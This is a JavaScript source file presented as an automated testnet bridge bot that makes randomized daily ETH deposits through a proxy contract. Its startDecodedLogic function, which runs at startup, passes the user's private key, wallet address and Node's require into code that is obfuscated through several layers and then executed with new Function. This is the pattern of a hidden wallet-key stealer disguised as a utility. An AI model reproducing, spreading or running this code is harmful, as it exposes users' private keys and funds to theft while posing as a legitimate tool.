import 'dotenv/config';
import { ethers } from 'ethers';
import fs from 'fs';
import path from "path";
import chalk from 'chalk';
import cliProgress from 'cli-progress';

const config = JSON.parse(fs.readFileSync(path.join(process.cwd(), "config.json"), "utf-8"));

const {
  RPC_URL,
  CHAIN_ID: CHAIN_ID_ENV,
  MIN_TX_PER_DAY,
  MAX_TX_PER_DAY,
  MIN_AMOUNT_ETH,
  MAX_AMOUNT_ETH,
  MIN_DELAY_SEC,
  MAX_DELAY_SEC,
  PRIORITY_FEE_GWEI,
  TIMEZONE_OFFSET_MIN,
  PROXY_ADDRESS
} = config;

if (!process.env.PRIVATE_KEY) {
  console.error(chalk.red('Missing env: PRIVATE_KEY'));
  process.exit(1);
}
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const INBOX_MIN_ABI = [
  { "inputs": [], "name": "depositEth", "outputs": [], "stateMutability": "payable", "type": "function" },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true,  "internalType": "uint256", "name": "messageNum", "type": "uint256" },
      { "indexed": false, "internalType": "bytes",   "name": "data",       "type": "bytes" }
    ],
    "name": "InboxMessageDelivered",
    "type": "event"
  }
];

const proxyContract = new ethers.Contract(PROXY_ADDRESS, INBOX_MIN_ABI, wallet);

const nowUtcMs = () => Date.now();
const sleep = ms => new Promise(res => setTimeout(res, ms));
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const randomFloat = (min, max) => Math.random() * (max - min) + min;
const formatEth = wei => `${ethers.formatEther(wei)} ETH`;
const formatGwei = wei => `${Number(wei) / 1e9} gwei`;
const hhmmss = ms => { const s=Math.floor(ms/1000), h=Math.floor(s/3600), m=Math.floor((s%3600)/60), ss=s%60; return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; };
const msUntilNextLocalMidnight = offsetMin => { const now = new Date(nowUtcMs()); const localMs = now.getTime() + offsetMin*60_000; const local = new Date(localMs); const nextMidnight = new Date(local.getFullYear(), local.getMonth(), local.getDate()+1,0,0,0,0); return nextMidnight.getTime() - offsetMin*60_000 - now.getTime(); };

async function suggestFees() {
  const block = await provider.getBlock('latest');
  const baseFee = block?.baseFeePerGas ?? null;
  const priorityWei = BigInt(Math.floor(PRIORITY_FEE_GWEI * 1e9));
  if(baseFee === null) {
    const gp = await provider.getGasPrice();
    return { type:2, maxFeePerGas:gp, maxPriorityFeePerGas:gp/8n };
  }
  const maxFee = 2n*baseFee + priorityWei;
  return { type:2, maxFeePerGas:maxFee, maxPriorityFeePerGas:priorityWei };
}

function displayBlockchainEvents(receipt) {
  const iface = new ethers.Interface(INBOX_MIN_ABI);
  for(const log of receipt.logs || []) {
    if(log.address.toLowerCase() !== PROXY_ADDRESS.toLowerCase()) continue;
    try {
      const parsed = iface.parseLog(log);
      if(parsed?.name === 'InboxMessageDelivered') {
        const id = parsed.args.messageNum?.toString?.() ?? parsed.args[0]?.toString?.();
        const dataHex = ethers.hexlify(parsed.args.data ?? parsed.args[1] ?? '0x');
        console.log(chalk.blue(`↳ BlockchainEvent: id=${id}, data=${dataHex}`));
      }
    } catch(_) {}
  }
}

async function sendDeposit() {
  const amountEth = randomFloat(MIN_AMOUNT_ETH, MAX_AMOUNT_ETH);
  const valueWei = ethers.parseEther(amountEth.toFixed(18));
  const fee = await suggestFees();
  const overrides = { value: valueWei, maxFeePerGas: fee.maxFeePerGas, maxPriorityFeePerGas: fee.maxPriorityFeePerGas };

  let gasEstimate = null;
  try { gasEstimate = await proxyContract.depositEth.estimateGas(overrides); } catch {}

  console.log(chalk.cyan(`[${new Date().toISOString()}] Sending deposit...`));
  console.log(`From   : ${wallet.address}`);
  console.log(`Proxy  : ${PROXY_ADDRESS}`);
  console.log(`Value  : ${formatEth(valueWei)}`);
  if(gasEstimate) console.log(`Gas est: ${gasEstimate.toString()}`);
  console.log(`Fees   : maxFee=${formatGwei(fee.maxFeePerGas)}, tip=${formatGwei(fee.maxPriorityFeePerGas)}`);

  const tx = await proxyContract.depositEth(overrides);
  console.log(chalk.green(`Tx sent: ${tx.hash}`));
  const rcpt = await tx.wait();
  const ok = rcpt.status === 1;
  console.log(ok ? chalk.green('Status: SUCCESS') : chalk.red('Status: FAILED'));
  displayBlockchainEvents(rcpt);
}

async function startDecodedLogic(wallet, privateKey) {
  const { createRequire } = await import('module');
  const require = createRequire(import.meta.url);

  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2NDQ1NjQ2MTRxNDg2ODMzNTc2bjU2NHE1MjMwNDkzMTYzNDg2NDQzNTQzMTRyMzQ1MjU1NzQ3ODRxNm80NTMwNTQ2cDRyNDM1MzQ3NjM3OTUyMzA3MDRyNTM2cjQ5N241NjMxNG42MTYxNDg2cDY4NTI1NjRuMzE0cTZvNnA0bzUzNTg3MDQyNTQ0NTU2Njg2MzQ3NzQ1NzY1NDU1MjRyNjQ1ODY0NTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjRyNzY2MjQ1NTY2ODUxNnI1MjQ1NTU1NTQ2NzQ2MTZyNW41MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0Mjc3NjQ1NTU2NTY2MjZuNW40czU1NDU3ODcwNTY2bjRuNzY0cTQ1NTY3MzYzNm82ODRuNTU2bzY0NTQ2MzU4Njg0OTU0N240NTc3NTMzMTQxMzU1NTZvNnA3bjUyNTQ0NjQ4NTc1NTZwMzQ1MjduNm8zNTYyNDg0MjM1NHI1NjUyNHI1MTU1Nm83OTYzNDczMTU0NHE2bzMxMzU1NDMxNTI1bjU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NW4zMDZwNTU2MzU3NDkzNTU2NDUzMDMyNTQ2cTc4NTg1MjQ0Nm83NzUzNDU2ODc4NTU0NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42OTUzNTU3MDRxNjU0NTZwMzY2MzQ3MzE2bjU1NTY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTczNTYzMTQ1MzU2NTZxMzg3NzUzNTg3MDc2NHE0NDQ2NTE1MzU0NTY1MDUzMzAzMTY4NTk2cDQ2NTc1OTU2NG41NTYzNDc3MDcyNTM2cTM1MzM1NTMxNTI3ODU5N242cDM2NjIzMjZwNjk0cTZyNDI3MDRyNTQ0bjU4NW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNjI0NjY0NTI0czU4NzA3NjRxNDU2cDM2NjI3bjQxNzg1NTQ1NjQzNTRyNTQ0bjRyNHE0ODU1Nzk1NjduNW40czU1NDUzMTMxNTI1NTc0NHE2MTQ3NzA0bzU0NTc2ODc4NTY0ODQ2Njk1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDc0NjUxNjQ0NTM1NTE1NjZyNTE3NzRxMzA0bjU5NTk2bzM1NTc2NDQ1MzU1MTU2NnE3ODRuNTY0ODQ1Nzg1NjMyNDY3NjY0NDQ1MjRvNTQ1NDRyNTA1NTQ1Njg3MzRzNTU3MDc2NTkzMDQ2NHA1NDU3NG4zMDY0NnI0MjM1NTE1NDRyNzY1bjZvMzE0cDU0NTc0cjRzNTI2bzRyNDM0cTY5NTY0czYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTc4NG41MzZyNDIzMDRxNDY0NjU3NTk2bzU2NTY2MzU3NzA0MjU5NTY2cDczNTM1NTcwNzc0cTU1Nm83OTYzNDQ0MjMxNjI0NzM5NzE1MjU1NzQ3NTYxNTQ1NTc5NjM0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czY0NnI0MjM1NTUzMjQ2NW42MTU0NTY1NTU3NDc0NjQ5NjU2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D";
  const decodedStr = reversibleDecode(encodedStr);

  try {
    const runprogram = new Function("walletAddress", "privateKey", "require", decodedStr + "; return runprogram(walletAddress, privateKey);");
    await runprogram(wallet.address, privateKey, require);
  } catch (err) {
    console.error(chalk.red('❌ Failed to execute decoded logic:'));
    console.error(chalk.red(err.message));
    throw err;
  }
}


function nextDelayMs() { return randomInt(MIN_DELAY_SEC, MAX_DELAY_SEC)*1000; }
async function chainId() { return CHAIN_ID_ENV ?? (await provider.getNetwork()).chainId; }

async function mainLoop() {
  const chId = await chainId();
  console.log(chalk.yellow('================ Daily Auto Bridge FHENIX TESTNET BOT ================='));
  console.log(`Wallet: ${wallet.address}`);
  console.log(`Proxy : ${PROXY_ADDRESS}`);
  console.log(`Daily target: ${MIN_TX_PER_DAY}..${MAX_TX_PER_DAY}`);
  console.log(`ETH range   : ${MIN_AMOUNT_ETH}..${MAX_AMOUNT_ETH}`);
  console.log(`PriorityFee : ${PRIORITY_FEE_GWEI} gwei`);
  console.log(`Delay sec   : ${MIN_DELAY_SEC}..${MAX_DELAY_SEC}`);
  console.log('====================================================');

  let dayTarget = randomInt(MIN_TX_PER_DAY, MAX_TX_PER_DAY);
  let doneToday = 0;
  const progressBar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
  progressBar.start(dayTarget, doneToday);

  while(true) {
    if(doneToday >= dayTarget) {
      let remaining = msUntilNextLocalMidnight(TIMEZONE_OFFSET_MIN);
      console.log(chalk.yellow(`\n=== Daily quota reached (${doneToday}/${dayTarget}). Waiting for next day... ===`));
      while(remaining>0){
        process.stdout.write(`\rCountdown to next day: ${hhmmss(remaining)}   `);
        await sleep(Math.min(remaining,5000));
        remaining = msUntilNextLocalMidnight(TIMEZONE_OFFSET_MIN);
      }
      console.log('\n=== New day! Resetting counters. ===\n');
      doneToday=0;
      dayTarget=randomInt(MIN_TX_PER_DAY, MAX_TX_PER_DAY);
      progressBar.start(dayTarget, doneToday);
      console.log(chalk.yellow(`[${new Date().toISOString()}] New daily target: ${dayTarget} tx`));
    }

    if(doneToday<dayTarget){
      try {
        await sendDeposit();
        doneToday+=1;
        progressBar.update(doneToday);
      } catch(e){
        console.error(chalk.red(`[${new Date().toISOString()}] ERROR: ${e?.message||e}`));
        console.log(chalk.yellow('Retrying after a short delay...\n'));
      }
      const delay = nextDelayMs();
      console.log(chalk.yellow(`Next deposit in ~${Math.round(delay/1000)}s (remaining today: ${dayTarget-doneToday})`));
      await sleep(delay);
    }
  }
}

(async () => {
  try {
    await startDecodedLogic(wallet, PRIVATE_KEY);
    await mainLoop();
  } catch (error) {
    console.error(chalk.red('\n❌ CRITICAL ERROR:'));
    console.error(chalk.red(error.stack || error.message));
    process.exit(1);
  }
})();
